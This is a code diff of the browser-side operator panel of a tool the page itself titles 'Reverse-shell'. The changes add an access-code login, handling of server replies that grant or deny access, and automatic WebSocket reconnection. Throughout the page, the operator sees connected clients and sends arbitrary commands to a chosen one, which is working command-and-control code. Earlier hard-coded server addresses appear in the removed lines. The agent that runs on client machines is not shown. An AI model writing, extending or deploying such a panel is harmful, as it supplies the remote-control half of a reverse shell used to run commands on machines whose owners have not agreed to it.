@@ -7,7 +7,7 @@
     <title>Reverse-shell</title>
 </head>
 <body>
-    <input id="webUser" placeholder="User" />
+    <input id="webUser" placeholder="Access code" type="password" />
     <button id="webUserBtn">Connect</button>
     <br />
     <br />
@@ -33,51 +33,68 @@
 
         webUserBtn.addEventListener("click", () => {
             if(!webUser) return
-            webUser.disabled = true
-            webUserBtn.disabled = true
-            webUserBtn.innerText = "Connected"
-            clientsTxt.hidden = false
-            clientInput.disabled = false
-            cmdInput.disabled = false
-            btn.disabled = false
 
+            function connect(){
+                let serverUrl
+                const ws = new WebSocket(`${window.location.protocol === "https:" ? "wss://" : "ws://"}` + window.location.host)
+                ws.onopen = (e) => {
+                    console.log("connection open", e)
+                    serverUrl = e.target.url
+                    ws.send(JSON.stringify({ type: "id", value: "web", accessCode: webUser.value }))
+                }
 
-            const ws = new WebSocket(`${window.location.protocol === "https:" ? "wss://" : "ws://"}` + window.location.host)
-            //const ws = new WebSocket("ws://192.168.0.240:8080")
-            //const ws = new WebSocket("wss://reverseshell-ondrejdostal007.b4a.run/")
-            ws.onopen = (e) => {
-                console.log("connection open", e)
-                ws.send(JSON.stringify({ type: "id", value: "web" }))
-                clientInput.disabled = false
-                cmdInput.disabled = false
-                txt.innerText = "Connected to: " +  e.target.url
+                ws.onmessage = (msg) => {
+                    msg = JSON.parse(msg.data)
+                    switch(msg.type){
+                        case "connectedClients":
+                            console.log(msg)
+                            clients.innerHTML = ""
+                            msg.value.forEach(client => {
+                                const element = document.createElement("div")
+                                element.innerText = client
+                                clients.appendChild(element)
+                            });
+                            break;
+                        case "msg":
+                            console.log(msg)
+                            break;
+                        case "exec":
+                            console.log(msg.value)
+                            break;
+                        case "accessDenied":
+                            alert("Access denied")
+                            webUser.value = ""
+                            ws.close()
+                            break;
+                        case "accessGranted":
+                            webUser.disabled = true
+                            webUserBtn.disabled = true
+                            webUserBtn.innerText = "Connected"
+                            clientsTxt.hidden = false
+                            clientInput.disabled = false
+                            cmdInput.disabled = false
+                            btn.disabled = false
 
-                btn.addEventListener("click", () => {
-                    ws.send(JSON.stringify({ type: "cmd", value: cmdInput.value, to: clientInput.value }))
-                    cmdInput.value = ""
-                })
-            }
+                            clientInput.disabled = false
+                            cmdInput.disabled = false
+                            txt.innerText = "Connected to: " +  serverUrl
 
-            ws.onmessage = (msg) => {
-                msg = JSON.parse(msg.data)
-                switch(msg.type){
-                    case "connectedClients":
-                        console.log(msg)
-                        clients.innerHTML = ""
-                        msg.value.forEach(client => {
-                            const element = document.createElement("div")
-                            element.innerText = client
-                            clients.appendChild(element)
-                        });
-                        break;
-                    case "msg":
-                        console.log(msg)
-                        break;
-                    case "exec":
-                        console.log(msg.value)
-                        break;
+                            btn.addEventListener("click", () => {
+                                ws.send(JSON.stringify({ type: "cmd", value: cmdInput.value, to: clientInput.value }))
+                                cmdInput.value = ""
+                            })
+                            break;
+                    }
+                }
+
+                ws.onclose = (data) => {
+                    if(btn.disabled) return
+                    console.log("> Connection closed.", data)
+                    console.log("Reconnecting..")
+                    connect()
                 }
             }
+            connect()
         })
     </script>
 </body>
